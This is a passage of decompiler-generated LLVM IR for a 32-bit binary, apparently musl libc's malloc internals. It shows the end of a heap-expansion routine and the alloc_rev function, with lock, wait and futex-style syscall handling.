dec_label_pc_8049f3d:                             ; preds = %dec_label_pc_8049f22, %dec_label_pc_8049f3a
  %v2_8049f44 = call i32 @__lock(i32* nonnull @global_var_805698c.330)
  %v0_8049f49 = load i32, i32* @global_var_8056998.331, align 8
  %v1_8049f51 = sub i32 0, %v0_8049f49
  %v1_8049f53 = load i32, i32* @edi, align 4
  %v2_8049f53 = and i32 %v1_8049f53, %v1_8049f51
  store i32 %v2_8049f53, i32* @esi, align 4
  %v0_8049f55 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8049f55, -2147483632
  br i1 %tmp, label %dec_label_pc_8049fee, label %dec_label_pc_8049f61

dec_label_pc_8049f61:                             ; preds = %dec_label_pc_8049f3d, %dec_label_pc_8049fee
  %v0_8049f72 = phi i32 [ %v0_8049f55, %dec_label_pc_8049f3d ], [ %v2_8049fee, %dec_label_pc_8049fee ]
  %v1_8049f68 = phi i32 [ %v0_8049f49, %dec_label_pc_8049f3d ], [ %v1_8049f6811, %dec_label_pc_8049fee ]
  %v0_8049f66 = phi i32 [ %v2_8049f53, %dec_label_pc_8049f3d ], [ %v1_8049fee, %dec_label_pc_8049fee ]
  %v0_8049f61 = load i32, i32* @global_var_8056994.332, align 4
  %v2_8049f68 = sub i32 %v0_8049f61, %v1_8049f68
  %tmp25 = icmp ugt i32 %v0_8049f72, %v2_8049f68
  br i1 %tmp25, label %dec_label_pc_8049f6e, label %dec_label_pc_8049fa4

dec_label_pc_8049f6e:                             ; preds = %dec_label_pc_8049f61
  store i32 %v0_8049f72, i32* %stack_var_-16, align 4
  %v2_8049f79 = call i32 @__expand_heap(i32* nonnull %stack_var_-16)
  %v1_8049f7e = icmp eq i32 %v2_8049f79, 0
  br i1 %v1_8049f7e, label %dec_label_pc_8049ff5, label %dec_label_pc_8049f82

dec_label_pc_8049f82:                             ; preds = %dec_label_pc_8049f6e
  %v1_8049f82 = load i32, i32* @global_var_8056994.332, align 4
  %v12_8049f82 = icmp eq i32 %v2_8049f79, %v1_8049f82
  %v0_8049f88 = load i32, i32* @esi, align 4
  br i1 %v12_8049f82, label %dec_label_pc_8049f82.dec_label_pc_8049f95_crit_edge, label %dec_label_pc_8049f8c

dec_label_pc_8049f82.dec_label_pc_8049f95_crit_edge: ; preds = %dec_label_pc_8049f82
  %v0_8049f99.pre = load i32, i32* @global_var_8056998.331, align 8
  %v1_8049fa7.pre.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8049f95

dec_label_pc_8049f8c:                             ; preds = %dec_label_pc_8049f82
  store i32 %v2_8049f79, i32* @global_var_8056998.331, align 8
  %v0_8049f91 = load i32, i32* @ebx, align 4
  %v2_8049f91 = sub i32 %v0_8049f91, %v0_8049f88
  store i32 %v2_8049f91, i32* @ebx, align 4
  br label %dec_label_pc_8049f95

dec_label_pc_8049f95:                             ; preds = %dec_label_pc_8049f82.dec_label_pc_8049f95_crit_edge, %dec_label_pc_8049f8c
  %v1_8049fa7.pre = phi i32 [ %v1_8049fa7.pre.pre, %dec_label_pc_8049f82.dec_label_pc_8049f95_crit_edge ], [ %v2_8049f91, %dec_label_pc_8049f8c ]
  %v1_8049fa416 = phi i32 [ %v0_8049f88, %dec_label_pc_8049f82.dec_label_pc_8049f95_crit_edge ], [ 0, %dec_label_pc_8049f8c ]
  %v0_8049f99 = phi i32 [ %v0_8049f99.pre, %dec_label_pc_8049f82.dec_label_pc_8049f95_crit_edge ], [ %v2_8049f79, %dec_label_pc_8049f8c ]
  %v4_8049f95 = load i32, i32* %stack_var_-16, align 4
  %v5_8049f95 = add i32 %v4_8049f95, %v2_8049f79
  store i32 %v5_8049f95, i32* @global_var_8056994.332, align 4
  br label %dec_label_pc_8049fa4

dec_label_pc_8049fa4:                             ; preds = %dec_label_pc_8049f61, %dec_label_pc_8049f95
  %v1_8049fa7 = phi i32 [ %v0_8049f72, %dec_label_pc_8049f61 ], [ %v1_8049fa7.pre, %dec_label_pc_8049f95 ]
  %v1_8049fa4 = phi i32 [ %v0_8049f66, %dec_label_pc_8049f61 ], [ %v1_8049fa416, %dec_label_pc_8049f95 ]
  %v0_8049fa4 = phi i32 [ %v1_8049f68, %dec_label_pc_8049f61 ], [ %v0_8049f99, %dec_label_pc_8049f95 ]
  %v2_8049fa4 = add i32 %v0_8049fa4, %v1_8049fa4
  store i32 %v2_8049fa4, i32* %esi.global-to-local, align 4
  %v2_8049fa7 = add i32 %v0_8049fa4, %v1_8049fa7
  store i32 %v2_8049fa7, i32* @global_var_8056998.331, align 8
  %v2_8049fb6 = call i32 @__unlock(i32* nonnull @global_var_805698c.330)
  br label %dec_label_pc_8049fbb

dec_label_pc_8049fbb:                             ; preds = %dec_label_pc_8049ff5, %dec_label_pc_8049fa4
  %v0_8049fbe = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8049f11, i32* %esi.global-to-local, align 4
  ret i32 %v0_8049fbe

dec_label_pc_8049fc4:                             ; preds = %dec_label_pc_8049f30
  %v5_8049fc4 = icmp ult i32 %v2_8049f30, 15
  br i1 %v5_8049fc4, label %dec_label_pc_8049f30, label %dec_label_pc_8049f3a

dec_label_pc_8049fd5:                             ; preds = %entry
  store i32 0, i32* @esi, align 4
  store i32 1, i32* @ebx, align 4
  %v2_8049fe3 = call i32 @__lock(i32* nonnull @global_var_805698c.330)
  %v0_8049fe8 = load i32, i32* @global_var_8056998.331, align 8
  %v0_8049fee.pre = load i32, i32* @ebx, align 4
  %v1_8049fee.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8049fee

dec_label_pc_8049fee:                             ; preds = %dec_label_pc_8049f3d, %dec_label_pc_8049fd5
  %v1_8049f6811 = phi i32 [ %v0_8049f49, %dec_label_pc_8049f3d ], [ %v0_8049fe8, %dec_label_pc_8049fd5 ]
  %v1_8049fee = phi i32 [ %v2_8049f53, %dec_label_pc_8049f3d ], [ %v1_8049fee.pre, %dec_label_pc_8049fd5 ]
  %v0_8049fee = phi i32 [ %v0_8049f55, %dec_label_pc_8049f3d ], [ %v0_8049fee.pre, %dec_label_pc_8049fd5 ]
  %v2_8049fee = add i32 %v0_8049fee, %v1_8049fee
  store i32 %v2_8049fee, i32* @ebx, align 4
  br label %dec_label_pc_8049f61

dec_label_pc_8049ff5:                             ; preds = %dec_label_pc_8049f6e
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8049ffe = call i32 @__unlock(i32* nonnull @global_var_805698c.330)
  br label %dec_label_pc_8049fbb

; uselistorder directives
  uselistorder i32 %v2_8049fee, { 1, 0 }
  uselistorder i32 %v2_8049f79, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8049f72, { 1, 2, 0 }
  uselistorder i32 %v0_8049f55, { 2, 1, 0 }
  uselistorder i32 %v2_8049f53, { 1, 0, 2 }
  uselistorder i32 %v0_8049f49, { 1, 0, 2 }
  uselistorder i32 %v2_8049f30, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* @global_var_8056998.331, { 1, 2, 3, 0, 4 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8049fee, { 1, 0 }
  uselistorder label %dec_label_pc_8049fa4, { 1, 0 }
  uselistorder label %dec_label_pc_8049f95, { 1, 0 }
  uselistorder label %dec_label_pc_8049f61, { 1, 0 }
  uselistorder label %dec_label_pc_8049f3d, { 1, 0 }
}

define i32 @alloc_rev() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v0_804a010 = load i32, i32* @ebp, align 4
  %v0_804a011 = load i32, i32* @edi, align 4
  %v0_804a012 = load i32, i32* @esi, align 4
  %v0_804a013 = load i32, i32* @ebx, align 4
  %v0_804a017 = load i32, i32* @eax, align 4
  %v1_804a017 = inttoptr i32 %v0_804a017 to i32*
  %v2_804a017 = load i32, i32* %v1_804a017, align 4
  store i32 %v2_804a017, i32* @edi, align 4
  %v1_804a01d = urem i32 %v2_804a017, 2
  %v2_804a01d = icmp eq i32 %v1_804a01d, 0
  %v1_804a023 = icmp eq i1 %v2_804a01d, false
  br i1 %v1_804a023, label %dec_label_pc_804a14e, label %dec_label_pc_804a030

dec_label_pc_804a030:                             ; preds = %entry, %dec_label_pc_804a142
  %v0_804a074 = phi i32 [ %storemerge, %dec_label_pc_804a142 ], [ %v2_804a017, %entry ]
  %v2_804a032 = udiv i32 %v0_804a074, 16
  %v1_804a035 = add nsw i32 %v2_804a032, -1
  store i32 %v1_804a035, i32* %eax.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_804a035, 33
  br i1 %tmp53, label %dec_label_pc_804a070, label %dec_label_pc_804a041

dec_label_pc_804a041:                             ; preds = %dec_label_pc_804a030
  %v6_804a04e = icmp ugt i32 %v1_804a035, 7168
  br i1 %v6_804a04e, label %dec_label_pc_804a070, label %dec_label_pc_804a050

dec_label_pc_804a050:                             ; preds = %dec_label_pc_804a041
  %tmp = sitofp i32 %v1_804a035 to float
  %v4_804a05b = bitcast float %tmp to i32
  %v2_804a05f = udiv i32 %v4_804a05b, 2097152
  %v1_804a062 = add nsw i32 %v2_804a05f, -496
  store i32 %v1_804a062, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a070

dec_label_pc_804a070:                             ; preds = %dec_label_pc_804a041, %dec_label_pc_804a030, %dec_label_pc_804a050
  %stack_var_-36.0 = phi i32 [ %v1_804a035, %dec_label_pc_804a030 ], [ 63, %dec_label_pc_804a041 ], [ %v1_804a062, %dec_label_pc_804a050 ]
  %sext = mul i32 %stack_var_-36.0, 16777216
  store i32 %v0_804a074, i32* @ecx, align 4
  %v0_804a076 = load i32, i32* @global_var_8056f8c.333, align 4
  store i32 %v0_804a076, i32* %eax.global-to-local, align 4
  %v2_804a07b = sdiv i32 %sext, 1048576
  store i32 %v2_804a07b, i32* %edx.global-to-local, align 4
  %v1_804a07e = add nsw i32 %v2_804a07b, 134572480
  %v1_804a084 = icmp eq i32 %v0_804a076, 0
  %v1_804a086 = add nsw i32 %v2_804a07b, 134572488
  store i32 %v1_804a086, i32* @ebp, align 4
  br i1 %v1_804a084, label %dec_label_pc_804a0d7, label %dec_label_pc_804a08b

dec_label_pc_804a08b:                             ; preds = %dec_label_pc_804a070
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v2_804a07b, i32* @esi, align 4
  %v2_804a092 = inttoptr i32 %v1_804a086 to i32*
  %v3_804a092 = load i32, i32* %v2_804a092, align 8
  store i32 1, i32* %v2_804a092, align 8
  store i32 %v3_804a092, i32* %eax.global-to-local, align 4
  %v1_804a095 = icmp eq i32 %v3_804a092, 0
  %v0_804a097 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a097 = add i32 %v0_804a097, 134572492
  store i32 %v1_804a097, i32* @ebx, align 4
  br i1 %v1_804a095, label %dec_label_pc_804a20b, label %dec_label_pc_804a0a3

dec_label_pc_804a0a3:                             ; preds = %dec_label_pc_804a08b, %dec_label_pc_804a0a3.dec_label_pc_804a0a3_crit_edge
  %v0_804a0b3 = phi i32 [ %v0_804a0b3.pre, %dec_label_pc_804a0a3.dec_label_pc_804a0a3_crit_edge ], [ %v1_804a097, %dec_label_pc_804a08b ]
  %v0_804a0b7 = load i32, i32* @ebp, align 4
  store i32 %v0_804a0b7, i32* %stack_var_-60, align 4
  %v3_804a0ba = inttoptr i32 %v0_804a0b3 to i32*
  %v4_804a0ba = call i32 @__wait(i32* %v3_804a0ba, i32 1, i32 1)
  %v0_804a0bf = load i32, i32* @esi, align 4
  %v1_804a0bf = add i32 %v0_804a0bf, 134572480
  store i32 %v1_804a0bf, i32* %edx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804a0ca = add i32 %v0_804a0bf, 134572488
  %v2_804a0ca = inttoptr i32 %v1_804a0ca to i32*
  %v3_804a0ca = load i32, i32* %v2_804a0ca, align 4
  store i32 1, i32* %v2_804a0ca, align 4
  store i32 %v3_804a0ca, i32* %eax.global-to-local, align 4
  %v1_804a0cd = icmp eq i32 %v3_804a0ca, 0
  %v1_804a0cf = icmp eq i1 %v1_804a0cd, false
  br i1 %v1_804a0cf, label %dec_label_pc_804a0a3.dec_label_pc_804a0a3_crit_edge, label %dec_label_pc_804a0d1

dec_label_pc_804a0a3.dec_label_pc_804a0a3_crit_edge: ; preds = %dec_label_pc_804a0a3
  %v0_804a0b3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a0a3

dec_label_pc_804a0d1:                             ; preds = %dec_label_pc_804a0a3
  store i32 %v0_804a017, i32* %edx.global-to-local, align 4
  %v2_804a0d5 = load i32, i32* %v1_804a017, align 4
  store i32 %v2_804a0d5, i32* @ecx, align 4
  br label %dec_label_pc_804a0d7

dec_label_pc_804a0d7:                             ; preds = %dec_label_pc_804a070, %dec_label_pc_804a20b, %dec_label_pc_804a0d1
  %v0_804a175 = phi i32 [ %v0_804a074, %dec_label_pc_804a070 ], [ %v2_804a20f, %dec_label_pc_804a20b ], [ %v2_804a0d5, %dec_label_pc_804a0d1 ]
  store i32 %v2_804a07b, i32* %eax.global-to-local, align 4
  %v1_804a0de = add nsw i32 %v2_804a07b, 134572496
  %v2_804a0de = inttoptr i32 %v1_804a0de to i32*
  %v3_804a0de = load i32, i32* %v2_804a0de, align 16
  store i32 %v3_804a0de, i32* %edx.global-to-local, align 4
  store i32 %v1_804a07e, i32* %ebp.global-to-local, align 4
  %v1_804a0ee = icmp eq i32 %v3_804a0de, 0
  br i1 %v1_804a0ee, label %dec_label_pc_804a16b, label %dec_label_pc_804a0f2

dec_label_pc_804a0f2:                             ; preds = %dec_label_pc_804a0d7
  %v1_804a0f2 = load i32, i32* @edi, align 4
  %v12_804a0f2 = icmp eq i32 %v0_804a175, %v1_804a0f2
  br i1 %v12_804a0f2, label %dec_label_pc_804a18c, label %dec_label_pc_804a0fa

dec_label_pc_804a0fa:                             ; preds = %dec_label_pc_804a16b.dec_label_pc_804a0fa_crit_edge, %dec_label_pc_804a0f2
  %v1_804a106 = phi i32 [ %v0_804a0fa.pre, %dec_label_pc_804a16b.dec_label_pc_804a0fa_crit_edge ], [ %v1_804a07e, %dec_label_pc_804a0f2 ]
  %v1_804a0fa = add i32 %v1_804a106, 8
  %v2_804a0fa = inttoptr i32 %v1_804a0fa to i32*
  %v3_804a0fa = load i32, i32* %v2_804a0fa, align 4
  store i32 %v3_804a0fa, i32* %eax.global-to-local, align 4
  store i32 %v1_804a0fa, i32* @edx, align 4
  %v1_804a100 = icmp eq i32 %v3_804a0fa, 0
  br i1 %v1_804a100, label %dec_label_pc_804a0fa.dec_label_pc_804a142_crit_edge, label %dec_label_pc_804a104

dec_label_pc_804a0fa.dec_label_pc_804a142_crit_edge: ; preds = %dec_label_pc_804a0fa
  %storemerge.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804a142

dec_label_pc_804a104:                             ; preds = %dec_label_pc_804a0fa
  store i32 0, i32* %v2_804a0fa, align 4
  %v2_804a109 = load i32, i32* %stack_var_-60, align 4
  %v1_804a112 = add nsw i32 %v2_804a07b, 134572484
  store i32 %v1_804a112, i32* %eax.global-to-local, align 4
  %v1_804a117 = add nsw i32 %v2_804a07b, 134572492
  %v2_804a117 = inttoptr i32 %v1_804a117 to i32*
  %v3_804a117 = load i32, i32* %v2_804a117, align 4
  store i32 %v3_804a117, i32* %eax.global-to-local, align 4
  %v1_804a11a = icmp eq i32 %v3_804a117, 0
  br i1 %v1_804a11a, label %dec_label_pc_804a161, label %dec_label_pc_804a11e

dec_label_pc_804a11e:                             ; preds = %dec_label_pc_804a104
  store i32 240, i32* @ebx, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v1_804a12f = call i32 @__vsyscall(i32 %v2_804a109)
  store i32 %v1_804a12f, i32* %eax.global-to-local, align 4
  %v10_804a134 = icmp eq i32 %v1_804a12f, -38
  br i1 %v10_804a134, label %dec_label_pc_804a158, label %dec_label_pc_804a139

dec_label_pc_804a139:                             ; preds = %dec_label_pc_804a11e
  store i32 %v0_804a017, i32* @edx, align 4
  %v2_804a13d = load i32, i32* %v1_804a017, align 4
  store i32 %v2_804a13d, i32* @ecx, align 4
  br label %dec_label_pc_804a142

dec_label_pc_804a142:                             ; preds = %dec_label_pc_804a0fa.dec_label_pc_804a142_crit_edge, %dec_label_pc_804a139, %dec_label_pc_804a161
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_804a0fa.dec_label_pc_804a142_crit_edge ], [ %v2_804a13d, %dec_label_pc_804a139 ], [ %v2_804a165, %dec_label_pc_804a161 ]
  store i32 %storemerge, i32* @edi, align 4
  %v1_804a142 = urem i32 %storemerge, 2
  %v2_804a142 = icmp eq i32 %v1_804a142, 0
  br i1 %v2_804a142, label %dec_label_pc_804a030, label %dec_label_pc_804a14e

dec_label_pc_804a14e:                             ; preds = %dec_label_pc_804a142, %entry
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v0_804a013, i32* @ebx, align 4
  store i32 %v0_804a012, i32* @esi, align 4
  store i32 %v0_804a011, i32* @edi, align 4
  store i32 %v0_804a010, i32* @ebp, align 4
  ret i32 0

dec_label_pc_804a158:                             ; preds = %dec_label_pc_804a11e
  %v0_804a158 = load i32, i32* @ebx, align 4
  store i32 %v0_804a158, i32* @eax, align 4
  %v0_804a15c = load i32, i32* %stack_var_-60, align 4
  %v1_804a15c = call i32 @__vsyscall(i32 %v0_804a15c)
  store i32 %v1_804a15c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a161

dec_label_pc_804a161:                             ; preds = %dec_label_pc_804a104, %dec_label_pc_804a158
  store i32 %v0_804a017, i32* %eax.global-to-local, align 4
  %v2_804a165 = load i32, i32* %v1_804a017, align 4
  store i32 %v2_804a165, i32* @ecx, align 4
  br label %dec_label_pc_804a142

dec_label_pc_804a16b:                             ; preds = %dec_label_pc_804a0d7
  store i32 %v2_804a07b, i32* %edx.global-to-local, align 4
  store i32 %v1_804a07e, i32* %ebp.global-to-local, align 4
  %v1_804a175 = load i32, i32* @edi, align 4
  %v12_804a175 = icmp eq i32 %v0_804a175, %v1_804a175
  store i32 %v1_804a086, i32* %eax.global-to-local, align 4
  %v2_804a17a = add nsw i32 %v2_804a07b, 134572500
  %v3_804a17a = inttoptr i32 %v2_804a17a to i32*
  store i32 %v1_804a086, i32* %v3_804a17a, align 4
  %v0_804a180 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a180 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a180 = add i32 %v1_804a180, 134572496
  %v3_804a180 = inttoptr i32 %v2_804a180 to i32*
  store i32 %v0_804a180, i32* %v3_804a180, align 4
  %v1_804a186 = icmp eq i1 %v12_804a175, false
  br i1 %v1_804a186, label %dec_label_pc_804a16b.dec_label_pc_804a0fa_crit_edge, label %dec_label_pc_804a16b.dec_label_pc_804a18c_crit_edge

dec_label_pc_804a16b.dec_label_pc_804a0fa_crit_edge: ; preds = %dec_label_pc_804a16b
  %v0_804a0fa.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804a0fa

dec_label_pc_804a16b.dec_label_pc_804a18c_crit_edge: ; preds = %dec_label_pc_804a16b
  %v0_804a190.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a18c

dec_label_pc_804a18c:                             ; preds = %dec_label_pc_804a0f2, %dec_label_pc_804a16b.dec_label_pc_804a18c_crit_edge
  %v0_804a190 = phi i32 [ %v0_804a190.pre, %dec_label_pc_804a16b.dec_label_pc_804a18c_crit_edge ], [ %v1_804a0f2, %dec_label_pc_804a0f2 ]
  %v4_804a07044 = sdiv i32 %sext, 16777216
  %v1_804a190 = and i32 %v0_804a190, -2
  store i32 %v1_804a190, i32* %edi.global-to-local, align 4
  %v2_804a193 = sub i32 %v0_804a017, %v1_804a190
  store i32 %v2_804a193, i32* @ecx, align 4
  %v1_804a195 = add i32 %v2_804a193, 12
  %v2_804a195 = inttoptr i32 %v1_804a195 to i32*
  %v3_804a195 = load i32, i32* %v2_804a195, align 4
  store i32 %v3_804a195, i32* %edx.global-to-local, align 4
  store i32 %v2_804a193, i32* %edi.global-to-local, align 4
  %v2_804a19a = add i32 %v2_804a193, 8
  %v3_804a19a = inttoptr i32 %v2_804a19a to i32*
  %v4_804a19a = load i32, i32* %v3_804a19a, align 4
  %v15_804a19a = icmp eq i32 %v3_804a195, %v4_804a19a
  br i1 %v15_804a19a, label %dec_label_pc_804a22c, label %dec_label_pc_804a1a3

dec_label_pc_804a1a3:                             ; preds = %dec_label_pc_804a18c, %.thread
  %v1_804a1a6 = phi i32 [ %v3_804a195, %dec_label_pc_804a18c ], [ %v3_804a25a, %.thread ]
  %v3_804a1a3 = phi i32 [ %v4_804a19a, %dec_label_pc_804a18c ], [ %v3_804a1a3.pre, %.thread ]
  store i32 %v3_804a1a3, i32* %eax.global-to-local, align 4
  %v2_804a1a6 = add i32 %v1_804a1a6, 8
  %v3_804a1a6 = inttoptr i32 %v2_804a1a6 to i32*
  store i32 %v3_804a1a3, i32* %v3_804a1a6, align 4
  %v0_804a1a9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804a1a9 = add i32 %v0_804a1a9, 8
  %v2_804a1a9 = inttoptr i32 %v1_804a1a9 to i32*
  %v3_804a1a9 = load i32, i32* %v2_804a1a9, align 4
  store i32 %v3_804a1a9, i32* %eax.global-to-local, align 4
  %v0_804a1ac = load i32, i32* %edx.global-to-local, align 4
  %v2_804a1ac = add i32 %v3_804a1a9, 12
  %v3_804a1ac = inttoptr i32 %v2_804a1ac to i32*
  store i32 %v0_804a1ac, i32* %v3_804a1ac, align 4
  %v0_804a1af = load i32, i32* %edi.global-to-local, align 4
  %v1_804a1af = add i32 %v0_804a1af, 4
  %v2_804a1af = inttoptr i32 %v1_804a1af to i32*
  %v3_804a1af = load i32, i32* %v2_804a1af, align 4
  %v0_804a1b2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804a1b2 = add i32 %v0_804a1b2, 8
  store i32 %v1_804a1b2, i32* @edx, align 4
  %v1_804a1b5 = or i32 %v3_804a1af, 1
  store i32 %v1_804a1b5, i32* %eax.global-to-local, align 4
  store i32 %v1_804a1b5, i32* %v2_804a1af, align 4
  %v0_804a1bb = load i32, i32* %eax.global-to-local, align 4
  %v1_804a1bb = and i32 %v0_804a1bb, -2
  store i32 %v1_804a1bb, i32* %eax.global-to-local, align 4
  %v0_804a1be = load i32, i32* %edi.global-to-local, align 4
  %v2_804a1be = add i32 %v0_804a1be, %v1_804a1bb
  %v3_804a1be = inttoptr i32 %v2_804a1be to i32*
  %v4_804a1be = load i32, i32* %v3_804a1be, align 4
  %v5_804a1be = or i32 %v4_804a1be, 1
  store i32 %v5_804a1be, i32* %v3_804a1be, align 4
  %v0_804a1c2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804a1c2 = add i32 %v0_804a1c2, 8
  %v2_804a1c2 = inttoptr i32 %v1_804a1c2 to i32*
  %v3_804a1c2 = load i32, i32* %v2_804a1c2, align 4
  store i32 %v3_804a1c2, i32* %eax.global-to-local, align 4
  %v1_804a1c5 = icmp eq i32 %v3_804a1c2, 0
  br i1 %v1_804a1c5, label %dec_label_pc_804a1fe, label %dec_label_pc_804a1c9

dec_label_pc_804a1c9:                             ; preds = %dec_label_pc_804a1a3
  store i32 0, i32* %v2_804a1c2, align 4
  %v2_804a1ce = load i32, i32* %stack_var_-60, align 4
  %v1_804a1d7 = add nsw i32 %v2_804a07b, 134572484
  store i32 %v1_804a1d7, i32* %eax.global-to-local, align 4
  %v1_804a1dc = add nsw i32 %v2_804a07b, 134572492
  %v2_804a1dc = inttoptr i32 %v1_804a1dc to i32*
  %v3_804a1dc = load i32, i32* %v2_804a1dc, align 4
  store i32 %v3_804a1dc, i32* %eax.global-to-local, align 4
  %v1_804a1df = icmp eq i32 %v3_804a1dc, 0
  br i1 %v1_804a1df, label %dec_label_pc_804a1fe, label %dec_label_pc_804a1e3

dec_label_pc_804a1e3:                             ; preds = %dec_label_pc_804a1c9
  store i32 240, i32* @ebx, align 4
  store i32 129, i32* @ecx, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v1_804a1f4 = call i32 @__vsyscall(i32 %v2_804a1ce)
  store i32 %v1_804a1f4, i32* %eax.global-to-local, align 4
  %v10_804a1f9 = icmp eq i32 %v1_804a1f4, -38
  br i1 %v10_804a1f9, label %dec_label_pc_804a216, label %dec_label_pc_804a1fe

dec_label_pc_804a1fe:                             ; preds = %dec_label_pc_804a1e3, %dec_label_pc_804a1c9, %dec_label_pc_804a1a3
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v0_804a013, i32* @ebx, align 4
  store i32 %v0_804a012, i32* @esi, align 4
  store i32 %v0_804a011, i32* @edi, align 4
  store i32 %v0_804a010, i32* @ebp, align 4
  ret i32 1

dec_label_pc_804a20b:                             ; preds = %dec_label_pc_804a08b
  store i32 %v0_804a017, i32* %eax.global-to-local, align 4
  %v2_804a20f = load i32, i32* %v1_804a017, align 4
  store i32 %v2_804a20f, i32* @ecx, align 4
  br label %dec_label_pc_804a0d7

dec_label_pc_804a216:                             ; preds = %dec_label_pc_804a1e3
  %v0_804a216 = load i32, i32* @ebx, align 4
  store i32 %v0_804a216, i32* @eax, align 4
  %v0_804a218 = load i32, i32* @edi, align 4
  store i32 %v0_804a218, i32* @ecx, align 4
  %v0_804a21a = load i32, i32* %stack_var_-60, align 4
  %v1_804a21a = call i32 @__vsyscall(i32 %v0_804a21a)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v0_804a013, i32* @ebx, align 4
  store i32 %v0_804a012, i32* @esi, align 4
  store i32 %v0_804a011, i32* @edi, align 4
  store i32 %v0_804a010, i32* @ebp, align 4
  ret i32 1

dec_label_pc_804a22c:                             ; preds = %dec_label_pc_804a18c
  %v2_804a23a = and i32 %v4_804a07044, 32
  %v3_804a23a = icmp eq i32 %v2_804a23a, 0
  %v1_804a23d = icmp eq i1 %v3_804a23a, false
  %v2_804a23d = zext i1 %v1_804a23d to i32
  store i32 %v2_804a23d, i32* %edx.global-to-local, align 4
  %v1_804a240 = zext i1 %v3_804a23a to i32
  store i32 %v1_804a240, i32* %eax.global-to-local, align 4
  %v2_804a243 = urem i32 %v4_804a07044, 32
  %v4_804a243 = icmp eq i32 %v2_804a243, 0
  br i1 %v4_804a243, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_804a22c
  %v5_804a243 = shl i32 %v2_804a23d, %v2_804a243
  store i32 %v5_804a243, i32* %edx.global-to-local, align 4
  %v5_804a245 = shl i32 %v1_804a240, %v2_804a243
  store i32 %v5_804a245, i32* %eax.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_804a22c, %bb
  %v0_804a24725 = phi i32 [ %v5_804a243, %bb ], [ %v2_804a23d, %dec_label_pc_804a22c ]
  %v0_804a24b = phi i32 [ %v5_804a245, %bb ], [ %v1_804a240, %dec_label_pc_804a22c ]
  %v1_804a247 = sub i32 -1, %v0_804a24725
  store i32 %v1_804a247, i32* %edx.global-to-local, align 4
  %v1_804a24b = sub i32 -1, %v0_804a24b
  store i32 %v1_804a24b, i32* %eax.global-to-local, align 4
  store i32 %v1_804a247, i32* @ecx, align 4
  %v2_804a253 = load i32, i32* @global_var_80569c0.334, align 4
  %v4_804a253 = and i32 %v2_804a253, %v1_804a24b
  store i32 %v4_804a253, i32* @global_var_80569c0.334, align 4
  %v3_804a256 = load i32, i32* @global_var_80569c4.335, align 4
  %v5_804a256 = and i32 %v3_804a256, %v1_804a247
  store i32 %v5_804a256, i32* @global_var_80569c4.335, align 4
  %v3_804a25a = load i32, i32* %v2_804a195, align 4
  store i32 %v3_804a25a, i32* %edx.global-to-local, align 4
  %v3_804a1a3.pre = load i32, i32* %v3_804a19a, align 4
  br label %dec_label_pc_804a1a3

; uselistorder directives
  uselistorder i32 %v3_804a25a, { 1, 0 }
  uselistorder i32 %v1_804a24b, { 1, 0 }
  uselistorder i32 %v1_804a247, { 2, 1, 0 }
  uselistorder i32 %v2_804a243, { 2, 1, 0 }
  uselistorder i32 %v2_804a20f, { 1, 0 }
  uselistorder i32 %v3_804a1a3, { 1, 0 }
  uselistorder i32 %v4_804a19a, { 1, 0 }
  uselistorder i32 %v3_804a195, { 1, 0, 2 }
  uselistorder i32 %v2_804a165, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v1_804a0f2, { 1, 0 }
  uselistorder i32 %v1_804a086, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804a07e, { 1, 0, 2 }
  uselistorder i32 %v2_804a07b, { 11, 10, 1, 2, 3, 4, 7, 6, 5, 0, 8, 9 }
  uselistorder i32 %v1_804a035, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_804a074, { 1, 2, 0 }
  uselistorder i32 %v2_804a017, { 1, 0, 2 }
  uselistorder i32* %v1_804a017, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804a017, { 2, 0, 4, 3, 1, 5 }
  uselistorder i32 %v0_804a013, { 2, 1, 0 }
  uselistorder i32 %v0_804a012, { 2, 1, 0 }
  uselistorder i32 %v0_804a011, { 2, 1, 0 }
  uselistorder i32 %v0_804a010, { 2, 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 1, 4 }
